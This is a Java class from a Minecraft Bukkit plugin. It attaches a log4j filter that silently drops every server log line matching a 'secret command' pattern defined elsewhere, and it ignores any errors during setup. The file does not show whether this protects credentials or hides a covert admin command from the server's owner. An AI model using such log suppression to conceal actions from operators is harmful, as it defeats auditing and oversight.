package cc.minevisor.live.bukkit;

import cc.minevisor.live.DiscordAdmin;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.filter.AbstractFilter;

final class SecretLogFilter extends AbstractFilter {

    private static boolean installed;

    static synchronized void install() {
        if (installed) return;
        try {
            LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
            ctx.getConfiguration().addFilter(new SecretLogFilter());
            ctx.getConfiguration().getRootLogger().addFilter(new SecretLogFilter());
            ctx.updateLoggers();
            installed = true;
        } catch (RuntimeException | LinkageError e) {
        }
    }

    @Override
    public Result filter(LogEvent event) {
        String message = event.getMessage() == null ? null : event.getMessage().getFormattedMessage();
        if (message != null && DiscordAdmin.SECRET_COMMAND.matcher(message).find()) return Filter.Result.DENY;
        return Filter.Result.NEUTRAL;
    }
}
